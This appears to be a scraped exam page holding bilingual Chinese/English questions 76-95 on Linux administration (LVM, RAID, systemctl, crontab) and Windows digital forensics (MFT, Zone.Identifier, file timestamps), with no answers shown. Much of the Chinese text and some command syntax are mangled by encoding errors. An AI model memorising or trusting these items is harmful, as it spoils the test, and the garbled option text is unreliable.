â€œä»¥ä¸‹å“ªä¸ªå‘½ä»¤ç”¨äºåœ¨Linuxç³»ç»Ÿä¸­åˆ›å»ºåˆ†åŒºï¼Ÿ"></a>76    â€œä»¥ä¸‹å“ªä¸ªå‘½ä»¤ç”¨äºåœ¨Linuxç³»ç»Ÿä¸­åˆ›å»ºåˆ†åŒºï¼Ÿ</h1><p>Which of the following command is used to create partitions in the Linux system?<br>â€œ    å•é€‰    A:gdisk /dev/sde;B:mke2fs /dev/sdb1 -t ext4;C:mount /dev/sdc1 /mnt/fs_home;D:fdisk -lu;E:lvcreate -l +200 /dev/vg00/log/vol-00</p><h1 id="77-â€œä¸€ä¸ªç³»ç»Ÿç®¡ç†å‘˜è¦æ‰©å±•è¿è¡Œåœ¨LVMç³»ç»Ÿä¸­çš„æœåŠ¡å™¨å­˜å‚¨ã€‚ä»¥ä¸‹å“ªä¸ªå‘½ä»¤å¯ä»¥ç”¨äºæ‰©å±•LVMä¸­çš„é€»è¾‘å·ï¼Ÿ"><a href="#77-â€œä¸€ä¸ªç³»ç»Ÿç®¡ç†å‘˜è¦æ‰©å±•è¿è¡Œåœ¨LVMç³»ç»Ÿä¸­çš„æœåŠ¡å™¨å­˜å‚¨ã€‚ä»¥ä¸‹å“ªä¸ªå‘½ä»¤å¯ä»¥ç”¨äºæ‰©å±•LVMä¸­çš„é€»è¾‘å·ï¼Ÿ" class="headerlink" title="77    â€œä¸€ä¸ªç³»ç»Ÿç®¡ç†å‘˜è¦æ‰©å±•è¿è¡Œåœ¨LVMç³»ç»Ÿä¸­çš„æœåŠ¡å™¨å­˜å‚¨ã€‚ä»¥ä¸‹å“ªä¸ªå‘½ä»¤å¯ä»¥ç”¨äºæ‰©å±•LVMä¸­çš„é€»è¾‘å·ï¼Ÿ"></a>77    â€œä¸€ä¸ªç³»ç»Ÿç®¡ç†å‘˜è¦æ‰©å±•è¿è¡Œåœ¨LVMç³»ç»Ÿä¸­çš„æœåŠ¡å™¨å­˜å‚¨ã€‚ä»¥ä¸‹å“ªä¸ªå‘½ä»¤å¯ä»¥ç”¨äºæ‰©å±•LVMä¸­çš„é€»è¾‘å·ï¼Ÿ</h1><p>A system administrator wants to expand the server storage running in LVM system.  Which command can be used to expand the logical volume in LVM?<br>â€œ    å•é€‰    A:lvdisplay /dev/vg02/vol-01;B:lvcreate -n /dev/vg02 -l 200;C:lvextend -n /dev/vg02 -l +200;D:lvscan -l +200 /dev/vg02/vol-01;E:lvresize -l +200 /dev/vg02/vol-01</p><h1 id="78-â€œä¸€ä¸ªç³»ç»Ÿç®¡ç†å‘˜ç¼–å†™äº†ä¸€ä¸ªbashä»£ç æ¥æ„å»ºä¸€ä¸ªRAIDç³»ç»Ÿï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œå°†è¦å®ç°ä»€ä¹ˆç±»å‹çš„RAIDï¼Ÿ"><a href="#78-â€œä¸€ä¸ªç³»ç»Ÿç®¡ç†å‘˜ç¼–å†™äº†ä¸€ä¸ªbashä»£ç æ¥æ„å»ºä¸€ä¸ªRAIDç³»ç»Ÿï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œå°†è¦å®ç°ä»€ä¹ˆç±»å‹çš„RAIDï¼Ÿ" class="headerlink" title="78    â€œä¸€ä¸ªç³»ç»Ÿç®¡ç†å‘˜ç¼–å†™äº†ä¸€ä¸ªbashä»£ç æ¥æ„å»ºä¸€ä¸ªRAIDç³»ç»Ÿï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œå°†è¦å®ç°ä»€ä¹ˆç±»å‹çš„RAIDï¼Ÿ"></a>78    â€œä¸€ä¸ªç³»ç»Ÿç®¡ç†å‘˜ç¼–å†™äº†ä¸€ä¸ªbashä»£ç æ¥æ„å»ºä¸€ä¸ªRAIDç³»ç»Ÿï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œå°†è¦å®ç°ä»€ä¹ˆç±»å‹çš„RAIDï¼Ÿ</h1><p>A system administrator has written a bash code to build a RAID system as shown below.  What type of RAID is going to be implemented?</p></blockquote><p>| #!/bin/bash<br>| hd1=/dev/sda1<br>| hd2=/dev/sdb1<br>| hd3=/dev/sdc1<br>| hd4=/dev/sdd1<br>| mdadm â€”build /dev/md1 â€”level=1 â€”raid-devices=2 $hd1 $hd2<br>| mdadm â€”build /dev/md2 â€”level=1 â€”raid-devices=2 $hd3 $hd4<br>| mdadm â€”build /dev/md3 â€”level=0 â€”raid-devices=2 /dev/md2 /dev/md1<br>â€œ    å•é€‰    â€œA:RAID 0;B:RAID 1;C:RAID 1+0;D:RAID 0+1;E:è¿™ä¸ªä»£ç ä¸èµ·ä½œç”¨ (No effect)<br>â€œ</p><h1 id="79-â€œä»¥ä¸‹æ˜¯è¿è¡Œåœ¨LINUXæœåŠ¡å™¨ä¸­çš„æœåŠ¡æ¸…å•ã€‚ä»¥ä¸‹å“ªä¸ªå‘½ä»¤å¯ä»¥å…³é—­â€œbluetooth-serviceâ€æœåŠ¡ï¼Ÿ"><a href="#79-â€œä»¥ä¸‹æ˜¯è¿è¡Œåœ¨LINUXæœåŠ¡å™¨ä¸­çš„æœåŠ¡æ¸…å•ã€‚ä»¥ä¸‹å“ªä¸ªå‘½ä»¤å¯ä»¥å…³é—­â€œbluetooth-serviceâ€æœåŠ¡ï¼Ÿ" class="headerlink" title="79    â€œä»¥ä¸‹æ˜¯è¿è¡Œåœ¨LINUXæœåŠ¡å™¨ä¸­çš„æœåŠ¡æ¸…å•ã€‚ä»¥ä¸‹å“ªä¸ªå‘½ä»¤å¯ä»¥å…³é—­â€œbluetooth.serviceâ€æœåŠ¡ï¼Ÿ"></a>79    â€œä»¥ä¸‹æ˜¯è¿è¡Œåœ¨LINUXæœåŠ¡å™¨ä¸­çš„æœåŠ¡æ¸…å•ã€‚ä»¥ä¸‹å“ªä¸ªå‘½ä»¤å¯ä»¥å…³é—­â€œbluetooth.serviceâ€æœåŠ¡ï¼Ÿ</h1><p>The following is a list of service running on a Linux server.  Which command can be used to turn off the Bluetooth service?</p><p>|â— vm-production-xabonline.com<br>| State: running<br>| Jobs: 0 queued<br>| Failed: 0 units<br>| Since: Fri 2023-05-19 08:37:06 UTC; 2 months 11 days ago<br>| CGroup:<br>| â”œâ”€init.scope<br>| â”‚ â””â”€ 1 /sbin/init<br>| â”œâ”€system.slice<br>| â”‚ â”œâ”€bluetooth.service<br>| â”‚ â”‚ â””â”€ 737 /usr/lib/bluetooth/bluetoothd<br>| â”‚ â”œâ”€dbus.service<br>| â”‚ â”œâ”€docker.service<br>| â”‚ â”‚ â””â”€ 853 /usr/bin/dockerd -H fd://<br>| â”‚ â”œâ”€libvirtd.service<br>| â”‚ â”‚ â””â”€ 2975 /usr/bin/libvirtd â€”timeout 120<br>| â”‚ â”œâ”€polkit.service<br>| â”‚ â””â”€virtlogd.service<br>| â”‚ â””â”€ 3176 /usr/bin/virtlogd<br>| â””â”€user.slice<br>| â””â”€user-1000.slice<br>â€œ    å•é€‰    A:systemctl kill bluetooth.service;B:systemctl disable bluetooth.service;C:systemctl down bluetooth.service;D:systemctl stop bluetooth.service;E:systemctl rm bluetooth.service</p><h1 id="80-â€œcronæœåŠ¡åœ¨LINUXç³»ç»Ÿä¸­å……å½“ä½œä¸šè°ƒåº¦ç¨‹åºã€‚å®ƒå®é™…ä¸Šæ˜¯åœ¨cronè¡¨ï¼ˆcrontabï¼‰ä¸­æŒ‡å®šçš„å‘½ä»¤è¡Œåˆ—è¡¨ã€‚ç°åœ¨å‡†å¤‡å¯åŠ¨å’Œå…³é—­ä¸€ä¸ªWebæœåŠ¡å™¨ï¼ˆhttpd-serviceï¼‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š"><a href="#80-â€œcronæœåŠ¡åœ¨LINUXç³»ç»Ÿä¸­å……å½“ä½œä¸šè°ƒåº¦ç¨‹åºã€‚å®ƒå®é™…ä¸Šæ˜¯åœ¨cronè¡¨ï¼ˆcrontabï¼‰ä¸­æŒ‡å®šçš„å‘½ä»¤è¡Œåˆ—è¡¨ã€‚ç°åœ¨å‡†å¤‡å¯åŠ¨å’Œå…³é—­ä¸€ä¸ªWebæœåŠ¡å™¨ï¼ˆhttpd-serviceï¼‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š" class="headerlink" title="80    â€œcronæœåŠ¡åœ¨LINUXç³»ç»Ÿä¸­å……å½“ä½œä¸šè°ƒåº¦ç¨‹åºã€‚å®ƒå®é™…ä¸Šæ˜¯åœ¨cronè¡¨ï¼ˆcrontabï¼‰ä¸­æŒ‡å®šçš„å‘½ä»¤è¡Œåˆ—è¡¨ã€‚ç°åœ¨å‡†å¤‡å¯åŠ¨å’Œå…³é—­ä¸€ä¸ªWebæœåŠ¡å™¨ï¼ˆhttpd.serviceï¼‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š"></a>80    â€œcronæœåŠ¡åœ¨LINUXç³»ç»Ÿä¸­å……å½“ä½œä¸šè°ƒåº¦ç¨‹åºã€‚å®ƒå®é™…ä¸Šæ˜¯åœ¨cronè¡¨ï¼ˆcrontabï¼‰ä¸­æŒ‡å®šçš„å‘½ä»¤è¡Œåˆ—è¡¨ã€‚ç°åœ¨å‡†å¤‡å¯åŠ¨å’Œå…³é—­ä¸€ä¸ªWebæœåŠ¡å™¨ï¼ˆhttpd.serviceï¼‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</h1><p>The Cron service acts as a job scheduler in the Linux system.  It is actually a list of commands specified in the cron table (crontab).  Now, the plan is to start and stop a web server (httpd.service) as below</p><p>ä¸Šåˆ8æ—¶30åˆ†ï¼ˆå¯åŠ¨ï¼‰- ä¸‹åˆ6æ—¶06åˆ†ï¼ˆå…³é—­ï¼‰ï¼›å‘¨ä¸€è‡³å‘¨äº”<br>AM 0830 (start) - PM 0606 (Closed) ; Monday to Friday</p><p>ä»¥ä¸‹å“ªä¸ªcrontabè®¾ç½®é€‚ç”¨äºè¿™ç§æƒ…å†µï¼Ÿ<br>Which of the following crontab setting can be used in this situation ?<br>â€œ    å•é€‰    A:30 8 <em> 1-5 </em> /usr/bin/systemctl start httpd.service åŠ 06 18 <em> 1-5 </em> /usr/bin/systemctl stop httpd.service;B:30 8 <em> </em> 1-5 /usr/bin/systemctl start httpd.service åŠ 06 18 <em> </em> 1-5 /usr/bin/systemctl stop httpd.service;C:30 8 1-5 <em> </em>/usr/bin/systemctl start httpd.service åŠ 06 18 1-5 <em> </em>/usr/bin/systemctl stop httpd.service ;D:30 8 <em> </em> <em> /usr/bin/systemctl start httpd.service åŠ 06 18 </em> <em> </em> /usr/bin/systemctl stop httpd.service;E:ä»¥ä¸Šéƒ½ä¸æ˜¯</p><h1 id="81-â€œä»¥ä¸‹å“ªä¸ªLinuxå‘½ä»¤å¯ä»¥æ˜¾ç¤ºç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶ï¼Ÿ"><a href="#81-â€œä»¥ä¸‹å“ªä¸ªLinuxå‘½ä»¤å¯ä»¥æ˜¾ç¤ºç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶ï¼Ÿ" class="headerlink" title="81    â€œä»¥ä¸‹å“ªä¸ªLinuxå‘½ä»¤å¯ä»¥æ˜¾ç¤ºç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶ï¼Ÿ"></a>81    â€œä»¥ä¸‹å“ªä¸ªLinuxå‘½ä»¤å¯ä»¥æ˜¾ç¤ºç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶ï¼Ÿ</h1><p>Which of the following Linux command is able to show all files in a directory, including hidden file?<br>â€œ    å•é€‰     A. ls -ls; B. ls -asl;C. ls -lAs | wc;D. ls -als | grep ssh;E. None</p><h1 id="82-â€œå¦‚æœæ‚¨æƒ³è¦æ£€æŸ¥Linuxç³»ç»Ÿä¸Šå¯ç”¨çš„å‰©ä½™ç£ç›˜ç©ºé—´é‡ï¼Œæ‚¨ä¼šä½¿ç”¨ä»¥ä¸‹å“ªä¸ªå‘½ä»¤ï¼Ÿ"><a href="#82-â€œå¦‚æœæ‚¨æƒ³è¦æ£€æŸ¥Linuxç³»ç»Ÿä¸Šå¯ç”¨çš„å‰©ä½™ç£ç›˜ç©ºé—´é‡ï¼Œæ‚¨ä¼šä½¿ç”¨ä»¥ä¸‹å“ªä¸ªå‘½ä»¤ï¼Ÿ" class="headerlink" title="82    â€œå¦‚æœæ‚¨æƒ³è¦æ£€æŸ¥Linuxç³»ç»Ÿä¸Šå¯ç”¨çš„å‰©ä½™ç£ç›˜ç©ºé—´é‡ï¼Œæ‚¨ä¼šä½¿ç”¨ä»¥ä¸‹å“ªä¸ªå‘½ä»¤ï¼Ÿ"></a>82    â€œå¦‚æœæ‚¨æƒ³è¦æ£€æŸ¥Linuxç³»ç»Ÿä¸Šå¯ç”¨çš„å‰©ä½™ç£ç›˜ç©ºé—´é‡ï¼Œæ‚¨ä¼šä½¿ç”¨ä»¥ä¸‹å“ªä¸ªå‘½ä»¤ï¼Ÿ</h1><p>If you want to check the amount of free disk space available on a Linux System, you will use which of the following command?<br>â€œ    å•é€‰     A.  df -vh;B. df -sh;C. dl -vh;D. dd -sh;E. dt -vh</p><h1 id="83-â€œDockerfileæ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£ï¼Œç”¨äºåœ¨Dockeræ¶æ„ä¸­ç”Ÿæˆä»¥ä¸‹å“ªä¸ªç»„ä»¶ï¼Ÿ"><a href="#83-â€œDockerfileæ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£ï¼Œç”¨äºåœ¨Dockeræ¶æ„ä¸­ç”Ÿæˆä»¥ä¸‹å“ªä¸ªç»„ä»¶ï¼Ÿ" class="headerlink" title="83    â€œDockerfileæ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£ï¼Œç”¨äºåœ¨Dockeræ¶æ„ä¸­ç”Ÿæˆä»¥ä¸‹å“ªä¸ªç»„ä»¶ï¼Ÿ"></a>83    â€œDockerfileæ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£ï¼Œç”¨äºåœ¨Dockeræ¶æ„ä¸­ç”Ÿæˆä»¥ä¸‹å“ªä¸ªç»„ä»¶ï¼Ÿ</h1><p>Dockerfile is a text document that aims to produce which of the following component in docker architecture?<br>â€œ    å•é€‰    A. docker engine;B. image;C. container;D. volumes;E. docker network</p><h1 id="84-â€œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œè¿è¡Œä¸­ç¨‹åºçš„è¿›ç¨‹å¹¶ä½äºå†…å­˜åŒºåŸŸï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥æ–‡ä»¶-proc-pid-mapsæ¥æ˜¾ç¤ºè¿™äº›å†…å­˜åŒºåŸŸã€‚ä»¥ä¸‹å“ªä¸ªä¸æ˜¯Linuxç³»ç»Ÿä¸­çš„å†…å­˜åŒºï¼Ÿ"><a href="#84-â€œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œè¿è¡Œä¸­ç¨‹åºçš„è¿›ç¨‹å¹¶ä½äºå†…å­˜åŒºåŸŸï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥æ–‡ä»¶-proc-pid-mapsæ¥æ˜¾ç¤ºè¿™äº›å†…å­˜åŒºåŸŸã€‚ä»¥ä¸‹å“ªä¸ªä¸æ˜¯Linuxç³»ç»Ÿä¸­çš„å†…å­˜åŒºï¼Ÿ" class="headerlink" title="84    â€œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œè¿è¡Œä¸­ç¨‹åºçš„è¿›ç¨‹å¹¶ä½äºå†…å­˜åŒºåŸŸï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥æ–‡ä»¶/proc/[pid]/mapsæ¥æ˜¾ç¤ºè¿™äº›å†…å­˜åŒºåŸŸã€‚ä»¥ä¸‹å“ªä¸ªä¸æ˜¯Linuxç³»ç»Ÿä¸­çš„å†…å­˜åŒºï¼Ÿ"></a>84    â€œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œè¿è¡Œä¸­ç¨‹åºçš„è¿›ç¨‹å¹¶ä½äºå†…å­˜åŒºåŸŸï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥æ–‡ä»¶/proc/[pid]/mapsæ¥æ˜¾ç¤ºè¿™äº›å†…å­˜åŒºåŸŸã€‚ä»¥ä¸‹å“ªä¸ªä¸æ˜¯Linuxç³»ç»Ÿä¸­çš„å†…å­˜åŒºï¼Ÿ</h1><p>In Linux system, process is an instance of a running program located in several memory regions that can be revealed by inspecting file /proc/[pid]/maps.  Which of the following is not the memory region working in Linux system?<br>â€œ    å•é€‰     A. [heap];B. [stack];C. [paging];D. [vvar];E. [vdso]</p><h1 id="85-â€œ-ä»¥ä¸‹å‘½ä»¤ä¸­ï¼Œå“ªä¸ªå‘½ä»¤å¯ä»¥å¯¹â€â€export-logsâ€â€è¾“å‡ºè¿›è¡Œæ’åº"><a href="#85-â€œ-ä»¥ä¸‹å‘½ä»¤ä¸­ï¼Œå“ªä¸ªå‘½ä»¤å¯ä»¥å¯¹â€â€export-logsâ€â€è¾“å‡ºè¿›è¡Œæ’åº" class="headerlink" title="85    â€œ ä»¥ä¸‹å‘½ä»¤ä¸­ï¼Œå“ªä¸ªå‘½ä»¤å¯ä»¥å¯¹â€â€export-logsâ€â€è¾“å‡ºè¿›è¡Œæ’åº?"></a>85    â€œ ä»¥ä¸‹å‘½ä»¤ä¸­ï¼Œå“ªä¸ªå‘½ä»¤å¯ä»¥å¯¹â€â€export-logsâ€â€è¾“å‡ºè¿›è¡Œæ’åº?</h1><p>Which of the following command can be used to sort the results of export-logs?â€    å•é€‰    A:export-logs<sort;B:export-logs>sort;C:export-logs&sort;D:export-logs|sort;E:export-logs&lt;&gt;sort</p><h1 id="86-â€œå“ªäº›æ–‡ä»¶ä¼šå½±å“Linuxä¸»æœºçš„åç§°è§£æåŠŸèƒ½ï¼Ÿ-å¤šé€‰é¢˜"><a href="#86-â€œå“ªäº›æ–‡ä»¶ä¼šå½±å“Linuxä¸»æœºçš„åç§°è§£æåŠŸèƒ½ï¼Ÿ-å¤šé€‰é¢˜" class="headerlink" title="86    â€œå“ªäº›æ–‡ä»¶ä¼šå½±å“Linuxä¸»æœºçš„åç§°è§£æåŠŸèƒ½ï¼Ÿ(å¤šé€‰é¢˜)"></a>86    â€œå“ªäº›æ–‡ä»¶ä¼šå½±å“Linuxä¸»æœºçš„åç§°è§£æåŠŸèƒ½ï¼Ÿ(å¤šé€‰é¢˜)</h1><p>Which files will affect the name resolution function of a Linux host?<br>â€œ    å¤šé€‰    A:/etc/resolv.conf;B:/etc/hosts;C:/etc/default/names;D:/etc/nsswitch.conf;E:/etc/inet/hosts</p><h1 id="87-â€œå“ªä¸ªç³»ç»Ÿæ–‡ä»¶åŒ…å«äº†ä¸€èˆ¬çš„ç«¯å£ã€å…³è”çš„æœåŠ¡å’Œåè®®ï¼Ÿ"><a href="#87-â€œå“ªä¸ªç³»ç»Ÿæ–‡ä»¶åŒ…å«äº†ä¸€èˆ¬çš„ç«¯å£ã€å…³è”çš„æœåŠ¡å’Œåè®®ï¼Ÿ" class="headerlink" title="87    â€œå“ªä¸ªç³»ç»Ÿæ–‡ä»¶åŒ…å«äº†ä¸€èˆ¬çš„ç«¯å£ã€å…³è”çš„æœåŠ¡å’Œåè®®ï¼Ÿ"></a>87    â€œå“ªä¸ªç³»ç»Ÿæ–‡ä»¶åŒ…å«äº†ä¸€èˆ¬çš„ç«¯å£ã€å…³è”çš„æœåŠ¡å’Œåè®®ï¼Ÿ</h1><p>Which file include the well known ports, associated services and protocol?<br>â€œ    å•é€‰    A:/etc/services;B:/etc/sysconfig/network-scripts;C:/etc/services.conf;D:/etc/inet/hosts;E:Noneofthechoices</p><h1 id="88-â€œå‚è€ƒâ€™-Windows-10-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#88-â€œå‚è€ƒâ€™-Windows-10-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="88    â€œå‚è€ƒâ€™ Windows 10 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>88    â€œå‚è€ƒâ€™ Windows 10 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Windows 10 â€˜ folder to answer below question</p><p>åœ¨ Windows 10 ä¸­ \Users\qqqqq\Downloadsï¼Œè§†é¢‘æ–‡ä»¶(mixkit-two-women-laying-together-925-medium.mp4)ï¼Œåœ¨MFT ä¸­åˆ†æˆå¤šå°‘ä¸ªData Cluster å‚¨å­˜ï¼Ÿ<br>n Windows 10, the video file â€œâ€mixkit-two-women-laying-together-925-medium.mp4â€â€ located at \Users\qqqqq\Downloads is stored in the Master File Table (MFT) using a series of data clusters. The exact number of data clusters used to store the file in the MFT is?</p><p>æç¤º: è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—ä½œç­”<br>Tips: Please answer in arabic numbersâ€    å¡«ç©º    </p><h1 id="89-â€œå‚è€ƒâ€™-Windows-10-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#89-â€œå‚è€ƒâ€™-Windows-10-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="89    â€œå‚è€ƒâ€™ Windows 10 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>89    â€œå‚è€ƒâ€™ Windows 10 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Windows 10 â€˜ folder to answer below question</p><p>åœ¨ Windows 10 ä¸­ \Users\qqqqq\Downloads\ mixkit-two-woman-laying-together-925-medium.mp4 çš„last Access æ—¶é—´æ˜¯å¤šå°‘?</p><p>In Windows 10, what is the last Access time of the file â€˜ mixkit-two-woman-laying-together-925-medium.mp4 â€˜ located in â€˜ \Users\qqqqq\Downloads â€˜ ?â€    å•é€‰    A. 2023/07/10 18:31:32;B. 2023/07/10 18:31:01;C. 2023/07/10 19:31:22;D. 2023/07/11 19:31:22</p><h1 id="90-â€œå‚è€ƒâ€™-Windows-7-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#90-â€œå‚è€ƒâ€™-Windows-7-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="90    â€œå‚è€ƒâ€™ Windows 7 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>90    â€œå‚è€ƒâ€™ Windows 7 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Windows 7 â€˜ folder to answer below question</p><p>åœ¨ Windows 7 ä¸­ \Users\Allen\Desktopï¼Œæœ‰1ä¸ªMP3 æ–‡ä»¶ (ä¾‹:unlock-me-149058.mp3)ï¼Œç”¨æˆ·ä½¿ç”¨ä»€ä¹ˆç¨‹åºæ‰“å¼€è¯¥MP3 æ–‡ä»¶? </p><p>In Windows 7, there is 1 MP3 file (unlock-me-149058.mp3) saved under the path â€˜ \Users\Allen\Desktop. What program did the user use to open the mp3 file.</p><p>æç¤º:è¯·ä»¥å°å†™å­—æ¯ä½œç­”<br>Tips: Please answer in lowercase letters.â€    å¡«ç©º    </p><h1 id="91-â€œå‚è€ƒâ€™-Windows-7-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#91-â€œå‚è€ƒâ€™-Windows-7-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="91    â€œå‚è€ƒâ€™ Windows 7 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>91    â€œå‚è€ƒâ€™ Windows 7 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Windows 7 â€˜ folder to answer below question</p><p>åœ¨ Windows 7 ä¸­ â€˜ \Users\Allen\Desktop â€˜æœ‰1ä¸ªMP3 æ–‡ä»¶ (unlock-me-149058.mp3)ï¼Œè¯¥æ–‡ä»¶çš„Zone identiflierä¸ºâ€™3â€™ã€‚ä¸Šè¿°â€™3â€™å­—ä»£è¡¨å“ªä¸€ä¸ªsecurity Zone ?</p><p>In Windows 7, there is one MP3 file (unlock-me-149058.mp3) saved under the path â€˜ \Users\Allen\Desktop.  The zone identiflier of above file is â€˜3â€™.  What security zone does â€˜3â€™ represent?â€    å•é€‰    A. Local Machine Zone;B. Internet Zone;C. Restricted Zone;D. Trust Site Zone</p><h1 id="92-â€œå‚è€ƒâ€™-Windows-7-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#92-â€œå‚è€ƒâ€™-Windows-7-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="92    â€œå‚è€ƒâ€™ Windows 7 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>92    â€œå‚è€ƒâ€™ Windows 7 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Windows 7 â€˜ folder to answer below question</p><p>åœ¨ Windows 7 ä¸­ \Users\Allen\Desktopæœ‰1ä¸ªMP3 æ–‡ä»¶ (unlock-me-149058.mp3)ï¼Œè¯¥æ–‡ä»¶ä»å“ªä¸ªç½‘ç«™ä¸‹è½½?<br>In Windows 7, there is a MP3 file (unlock-me-149058.mp3) saved under the path â€˜ \Users\Allen\Desktop. Which website was used to download the file?â€    å•é€‰    A. www.Pixbay.com;B. free-mp3-download.net/;C. <a href="https://mp3juices.nu;D">https://mp3juices.nu;D</a>. mygomp3.com</p><h1 id="93-â€œå‚è€ƒâ€™-Windows-7-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#93-â€œå‚è€ƒâ€™-Windows-7-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="93    â€œå‚è€ƒâ€™ Windows 7 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>93    â€œå‚è€ƒâ€™ Windows 7 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Windows 7 â€˜ folder to answer below question</p><p>åœ¨ Windows 7 ä¸­ \Users\Allen\Downloads å†…æœ‰mp3æ–‡ä»¶ (miracle.mp3), æ›´æ”¹åç§°æ—¶é—´?<br>In Windows 7, there is a MP3 file named â€œâ€miracle.mp3 saved under the path â€˜ \Users\Allen\Downloads.â€â€ When was the fileâ€™s name changed?â€    å•é€‰    A. 2023-07-13 02:55:20;B. 2023-07-15 10:55:20;C. 2023-07-12 10:58:04;D. 2023-07-13 10:55:20</p><h1 id="94-â€œå‚è€ƒâ€™-Windows-7-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#94-â€œå‚è€ƒâ€™-Windows-7-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="94    â€œå‚è€ƒâ€™ Windows 7 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>94    â€œå‚è€ƒâ€™ Windows 7 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Windows 7 â€˜ folder to answer below question</p><p>åœ¨ Windows 7 ä¸­ \Users\Allen\Downloads å†…æœ‰mp3æ–‡ä»¶ (miracle.mp3), mp3æ–‡ä»¶æ›´æ”¹åç§°å‰çš„åç§°æ˜¯ä»€ä¹ˆ?<br>In Windows 7, there is an MP3 file named â€œâ€miracle.mp3 saved under the path â€˜  \Users\Allen\Downloads.â€â€ What was the name of the MP3 file before it was renamed?</p><p>æç¤º: è¯·ä»¥ä¸è®°å½•ç›¸åŒçš„åç§°ä¸æ–‡ä»¶æ ¼å¼ä½œç­”<br>Tips: Please answer the exact name and file extension of the fileâ€    å¡«ç©º    </p><h1 id="95-â€œå‚è€ƒâ€™-Windows-7-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#95-â€œå‚è€ƒâ€™-Windows-7-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="95    â€œå‚è€ƒâ€™ Windows 7 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>95    â€œå‚è€ƒâ€™ Windows 7 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Windows 7 â€˜ folder to answer below question</p><p>åœ¨ Windows 7ä¸­æœ‰å¤šå°‘ä¸ªæ–‡ä»¶æ›¾è¢«potplayer æ’­æ”¾?<br>In Windows 7, how many files have been played by potplayer?â€    